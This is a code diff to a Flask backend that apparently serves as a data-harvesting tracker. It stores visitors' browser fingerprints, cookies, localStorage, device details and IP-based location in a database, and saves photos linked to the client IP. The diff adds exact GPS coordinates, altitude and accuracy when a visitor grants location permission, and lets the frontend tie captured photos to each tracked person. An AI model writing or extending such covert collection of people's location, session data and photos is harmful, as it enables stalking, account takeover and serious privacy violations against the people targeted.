@@ -202,7 +202,29 @@ def collect_data():
         # Extract data from the payload
         device_info = json.dumps(data.get('deviceInfo', {}))
         fingerprint = data.get('fingerprint', {}).get('fp', '')
-        location_data = json.dumps(data.get('ipInfo', {}))
+
+        # Prioritize GPS coordinates over IP location
+        device_coords = data.get('deviceCoords')
+        ip_info = data.get('ipInfo', {})
+
+        if device_coords and device_coords.get('lat') and device_coords.get('lon'):
+            # User granted location permission - use GPS coordinates
+            location_data = json.dumps({
+                **ip_info,  # Keep IP info for reference
+                'gps': device_coords,
+                'latitude': device_coords.get('lat'),
+                'longitude': device_coords.get('lon'),
+                'location_type': 'gps',
+                'accuracy': device_coords.get('accuracy'),
+                'altitude': device_coords.get('altitude')
+            })
+        else:
+            # Location permission denied - use IP-based location
+            location_data = json.dumps({
+                **ip_info,
+                'location_type': 'ip'
+            })
+
         storage_info = json.dumps({
             'cookies': data.get('cookies', []),
             'localStorage': data.get('localStorage', {}),
@@ -502,14 +524,22 @@ def save_photo():
         photo_ip = request.form.get('ip_address', '')
         capture_source = request.form.get('capture_source', 'unknown')
 
+        # Allow explicit data_entry_id from frontend (for per-user captures)
+        data_entry_id = request.form.get('data_entry_id', None)
+        if data_entry_id:
+            data_entry_id = int(data_entry_id)
+
         if photo.filename == '':
             return jsonify({'status': 'error', 'message': 'No file selected'}), 400
 
+        # Use the IP address from frontend if provided, otherwise get from request
+        if photo_ip:
+            client_ip = photo_ip
+        else:
+            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
         # Generate unique filename
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
-        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        if not photo_ip:
-            photo_ip = client_ip
         safe_ip = client_ip.replace('.', '_').replace(':', '_')
         filename = f'photo_{timestamp}_{safe_ip}.jpg'
         filepath = os.path.join(PHOTOS_FOLDER, filename)
@@ -521,9 +551,8 @@ def save_photo():
         # Get client info
         user_agent = request.headers.get('User-Agent', '')
 
-        # Try to find matching data entry by fingerprint
-        data_entry_id = None
-        if fingerprint:
+        # Try to find matching data entry by fingerprint (only if not explicitly provided)
+        if not data_entry_id and fingerprint:
             conn = sqlite3.connect(DB_PATH)
             c = conn.cursor()
             c.execute('SELECT id FROM collected_data WHERE fingerprint = ? ORDER BY timestamp DESC LIMIT 1', (fingerprint,))
